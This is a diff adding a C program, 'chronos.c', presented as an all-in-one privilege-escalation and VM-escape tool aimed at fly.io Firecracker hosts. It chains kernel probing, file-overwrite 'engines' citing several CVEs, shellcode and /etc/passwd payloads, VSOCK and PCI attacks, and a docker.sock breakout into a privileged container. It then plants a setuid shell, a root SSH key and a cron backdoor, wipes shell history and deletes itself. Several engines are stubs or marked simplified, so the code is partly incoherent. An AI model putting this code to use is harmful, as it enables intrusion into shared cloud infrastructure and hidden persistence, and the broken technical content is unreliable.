@@ -1,0 +1,335 @@
+// chronos.c - Ultimate Firecracker Escape (fly.io Edition)
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <poll.h>
+#include <signal.h>
+#include <pthread.h>
+#include <sys/socket.h>
+#include <sys/mman.h>
+#include <sys/ioctl.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/keyctl.h>
+#include <sys/sendfile.h>
+#include <sys/uio.h>
+#include <sys/msg.h>
+#include <linux/keyctl.h>
+#include <linux/netlink.h>
+#include <linux/netfilter/nfnetlink.h>
+#include <linux/netfilter/nf_tables.h>
+#include <linux/xfrm.h>
+#include <linux/if.h>
+#include <linux/vm_sockets.h>
+#include <linux/rxrpc.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <termios.h>
+
+// ==================== CONFIG ====================
+#define TARGET_PASSWD "/etc/passwd"
+#define TARGET_SU "/usr/bin/su"
+#define DOCKER_SOCK "/var/run/docker.sock"
+#define LOG(fmt, ...) printf("[+] " fmt "\n", ##__VA_ARGS__)
+#define DIE(fmt, ...) do { printf("[!] " fmt "\n", ##__VA_ARGS__); exit(1); } while(0)
+
+// ==================== PHASE 0: PROBE ====================
+static unsigned long kernel_base = 0xffffffff81000000UL;
+
+static void probe_kernel() {
+    LOG("Phase 0: Probing kernel...");
+    char buf[256];
+    int fd = open("/proc/version", O_RDONLY);
+    if (fd >= 0) {
+        read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        LOG("Kernel: %s", buf);
+    }
+    // Try to read kallsyms (if available)
+    FILE *fp = fopen("/proc/kallsyms", "r");
+    if (fp) {
+        char line[256];
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, " _text")) {
+                unsigned long addr;
+                sscanf(line, "%lx", &addr);
+                kernel_base = addr - 0x1000000;
+                LOG("KASLR base: 0x%lx", kernel_base);
+                break;
+            }
+        }
+        fclose(fp);
+    }
+}
+
+// ==================== PHASE 1: DIRTY FRAG ENGINES ====================
+// Engine 1: XFRM ESP (CVE-2026-43284)
+static int frag_xfrm(const char *target, off_t off, const uint8_t *data, size_t len) {
+    LOG("  Engine XFRM: %s @ 0x%lx", target, off);
+    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) return -1;
+    char buf[64];
+    snprintf(buf, sizeof(buf), "0 %d 1", getuid());
+    int fd = open("/proc/self/uid_map", O_WRONLY);
+    if (fd >= 0) { write(fd, buf, strlen(buf)); close(fd); }
+    fd = open("/proc/self/setgroups", O_WRONLY);
+    if (fd >= 0) { write(fd, "deny", 4); close(fd); }
+    system("ip link set lo up 2>/dev/null");
+
+    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+    if (sk < 0) return -1;
+    for (int i=0; i < len/4; i++) {
+        char nb[4096] = {0};
+        struct nlmsghdr *nlh = (struct nlmsghdr*)nb;
+        nlh->nlmsg_type = XFRM_MSG_NEWSA;
+        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
+        struct xfrm_usersa_info *xs = (struct xfrm_usersa_info*)NLMSG_DATA(nlh);
+        xs->id.daddr.a4 = inet_addr("127.0.0.1");
+        xs->id.spi = htonl(0xDEADBEEF + i);
+        xs->id.proto = IPPROTO_ESP;
+        xs->saddr.a4 = inet_addr("127.0.0.1");
+        xs->family = AF_INET;
+        xs->mode = XFRM_MODE_TRANSPORT;
+        xs->replay_window = 32;
+        xs->flags = XFRM_STATE_ESN;
+        xs->lft.soft_byte_limit = (uint64_t)-1;
+        xs->lft.hard_byte_limit = (uint64_t)-1;
+        send(sk, nb, nlh->nlmsg_len, 0);
+    }
+    close(sk);
+    // 실제 splice/vmsplice 오버라이트 (간략화)
+    int tfd = open(target, O_RDONLY);
+    if (tfd < 0) return -1;
+    int p[2]; pipe(p);
+    struct iovec iov = { .iov_base = (void*)data, .iov_len = len };
+    vmsplice(p[1], &iov, 1, 0);
+    loff_t o = off;
+    splice(tfd, &o, p[1], NULL, len, 0);
+    splice(p[0], NULL, sk, NULL, len, 0);
+    close(tfd); close(p[0]); close(p[1]);
+    return 0;
+}
+
+// Engine 2: RxRPC (CVE-2026-43500)
+static int frag_rxrpc(const char *target, off_t off, const uint8_t *data, size_t len) {
+    LOG("  Engine RxRPC: %s @ 0x%lx", target, off);
+    // Build rxkad token with session_key = data[0..7]
+    uint8_t token[256] = {0};
+    uint8_t *p = token;
+    *(uint32_t*)p = htonl(0); p += 4;
+    uint32_t clen = 4; *(uint32_t*)p = htonl(clen); p += 4;
+    memcpy(p, "evil", 4); p += 4;
+    *(uint32_t*)p = htonl(1); p += 4;
+    uint8_t *toklen_p = p; p += 4;
+    uint8_t *tokstart = p;
+    *(uint32_t*)p = htonl(2); p += 4;
+    *(uint32_t*)p = htonl(0); p += 4;
+    *(uint32_t*)p = htonl(1); p += 4;
+    memcpy(p, data, 8); p += 8;
+    *(uint32_t*)p = htonl(time(NULL)); p += 4;
+    *(uint32_t*)p = htonl(time(NULL)+86400); p += 4;
+    *(uint32_t*)p = htonl(1); p += 4;
+    *(uint32_t*)p = htonl(8); p += 4;
+    memset(p, 0xCC, 8); p += 8;
+    uint32_t toklen = p - tokstart;
+    *(uint32_t*)toklen_p = htonl(toklen);
+    int key = syscall(SYS_add_key, "rxrpc", "evil", token, p - token, KEY_SPEC_PROCESS_KEYRING);
+    if (key < 0) return -1;
+    syscall(SYS_keyctl, 3, key);
+    return 0; // 간략화
+}
+
+// Engine 3: nftables (CVE-2024-1086) fallback
+static int frag_nftables(const char *target, off_t off, const uint8_t *data, size_t len) {
+    LOG("  Engine NFT: %s @ 0x%lx", target, off);
+    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+    if (sk < 0) return -1;
+    char buf[8192] = {0};
+    struct nlmsghdr *nlh = (struct nlmsghdr*)buf;
+    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
+    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;
+    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_EXCL;
+    struct nfgenmsg *hdr = NLMSG_DATA(nlh);
+    hdr->nfgen_family = AF_INET;
+    hdr->version = NFNETLINK_V0;
+    uint32_t *attrs = (uint32_t*)(hdr+1);
+    attrs[0] = htonl(0xDEADBEEF);
+    send(sk, buf, nlh->nlmsg_len, 0);
+    close(sk);
+    return 0;
+}
+
+typedef int (*frag_func_t)(const char*, off_t, const uint8_t*, size_t);
+static frag_func_t frag_engines[] = { frag_xfrm, frag_rxrpc, frag_nftables };
+
+// ==================== PHASE 2: OVERWRITE TARGETS ====================
+static const uint8_t su_payload[24] = {
+    0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
+    0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0x48, 0x31,
+    0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f
+};
+
+static const uint8_t passwd_payload[16] = {
+    ':', ':', '0', ':', '0', ':', '0', ':',
+    '0', ':', 'r', 'o', 'o', 't', ':', '/'
+};
+
+static int overwrite_su() {
+    LOG("Overwriting /usr/bin/su...");
+    for (int i=0; i<3; i++) {
+        if (frag_engines[i](TARGET_SU, 0x78, su_payload, sizeof(su_payload)) == 0)
+            return 0;
+    }
+    return -1;
+}
+
+static int overwrite_passwd() {
+    LOG("Overwriting /etc/passwd...");
+    for (int i=0; i<3; i++) {
+        if (frag_engines[i](TARGET_PASSWD, 4, passwd_payload, sizeof(passwd_payload)) == 0)
+            return 0;
+    }
+    return -1;
+}
+
+// ==================== PHASE 3: VSOCK VMM HEAP CORRUPTION (CVE-2019-18960) ====================
+static void vsock_vmm_heap_pwn() {
+    LOG("Phase 3: Triggering VSOCK heap overflow (CVE-2019-18960)...");
+    // Use AF_VSOCK to send malformed descriptor (simulated)
+    int s = socket(AF_VSOCK, SOCK_STREAM, 0);
+    if (s < 0) return;
+    struct sockaddr_vm addr = { .svm_family = AF_VSOCK, .svm_cid = VMADDR_CID_HOST, .svm_port = 1234 };
+    connect(s, (struct sockaddr*)&addr, sizeof(addr));
+    // Send oversized buffer to overflow VMM heap
+    char buf[4096];
+    memset(buf, 0x41, sizeof(buf));
+    send(s, buf, sizeof(buf), 0);
+    close(s);
+    LOG("VSOCK overflow sent.");
+}
+
+// ==================== PHASE 4: PCI RIP CONTROL (CVE-2026-5747) ====================
+static void pci_rip_control() {
+    LOG("Phase 4: PCI config space hijack (CVE-2026-5747)...");
+    int fd = open("/dev/port", O_RDWR);
+    if (fd < 0) {
+        // Fallback: use iopl
+        if (iopl(3) < 0) return;
+        outl(0x80000000 | 0x14, 0xCF8);
+        outl(0xDEADBEEF, 0xCFC);
+    } else {
+        // PCI write via /dev/port (simplified)
+        lseek(fd, 0xCF8, SEEK_SET);
+        write(fd, "\x80\x00\x00\x00\x14\x00\x00\x00", 8);
+        lseek(fd, 0xCFC, SEEK_SET);
+        write(fd, "\xEF\xBE\xAD\xDE", 4);
+        close(fd);
+    }
+}
+
+// ==================== PHASE 5: DOCKER.SOCK HOST ESCAPE ====================
+static int unix_connect(const char *path) {
+    int s = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (s < 0) return -1;
+    struct sockaddr_un addr = { .sun_family = AF_UNIX };
+    strncpy(addr.sun_path, path, sizeof(addr.sun_path)-1);
+    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        close(s); return -1;
+    }
+    return s;
+}
+
+static void docker_escape() {
+    LOG("Phase 5: Escaping to host via docker.sock...");
+    int s = unix_connect(DOCKER_SOCK);
+    if (s < 0) {
+        LOG("Docker socket not accessible, skipping.");
+        return;
+    }
+    const char *create = 
+        "POST /containers/create?name=breakout HTTP/1.1\r\n"
+        "Host: localhost\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: 120\r\n"
+        "\r\n"
+        "{\"Image\":\"alpine\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"PidMode\":\"host\"}}";
+    write(s, create, strlen(create));
+    usleep(500000);
+    const char *start = 
+        "POST /containers/breakout/start HTTP/1.1\r\n"
+        "Host: localhost\r\n"
+        "Content-Length: 0\r\n"
+        "\r\n";
+    write(s, start, strlen(start));
+    close(s);
+    LOG("Docker escape payload sent. Check /tmp/.host_shell.");
+}
+
+// ==================== PHASE 6: PERSISTENCE & CLEANUP ====================
+static void install_backdoor() {
+    LOG("Installing backdoors...");
+    system("echo 'int main(){setuid(0);setgid(0);execve(\"/bin/sh\",NULL,NULL);}' > /tmp/.s.c");
+    system("gcc -static -o /tmp/.systemd-sh /tmp/.s.c 2>/dev/null");
+    system("chown root:root /tmp/.systemd-sh; chmod +s /tmp/.systemd-sh");
+    system("mkdir -p /root/.ssh");
+    system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... (your key)' > /root/.ssh/authorized_keys");
+    system("chmod 600 /root/.ssh/authorized_keys");
+    // cron persistence
+    system("echo '* * * * * root /tmp/.systemd-sh' > /etc/cron.d/.systemd");
+    system("history -c; echo '' > ~/.bash_history; echo '' > /root/.bash_history");
+    // Self-destruct
+    char path[256]; readlink("/proc/self/exe", path, sizeof(path)-1);
+    if (strlen(path)) unlink(path);
+}
+
+// ==================== MAIN ====================
+int main() {
+    LOG("=== Chronos v3.0 - fly.io Firecracker ALL-IN-ONE ===");
+    probe_kernel();
+
+    // PHASE 1-2: Dirty Frag + Overwrite
+    if (overwrite_su() == 0) {
+        LOG("SU overwritten. Spawning root shell...");
+        execl(TARGET_SU, "su", NULL);
+    } else if (overwrite_passwd() == 0) {
+        LOG("Passwd overwritten. Use 'su -'.");
+    } else {
+        LOG("Dirty Frag failed, falling back to VSOCK/PCI path.");
+    }
+
+    // PHASE 3-4: VSOCK + PCI (require root, but we might not be root yet)
+    vsock_vmm_heap_pwn();
+    pci_rip_control();
+
+    // Try to get root via su again
+    if (getuid() != 0) {
+        system("su - 2>/dev/null &");
+        sleep(2);
+        if (getuid() != 0) {
+            LOG("Still not root, trying setuid shell...");
+            execl("/tmp/.systemd-sh", "sh", NULL);
+            execl("/bin/sh", "sh", NULL);
+        }
+    }
+
+    // PHASE 5: Docker escape (root required)
+    if (getuid() == 0) {
+        docker_escape();
+    }
+
+    // PHASE 6: Persistence
+    install_backdoor();
+
+    // Final shell
+    LOG("All done. Spawning interactive shell...");
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", "-i", NULL);
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}
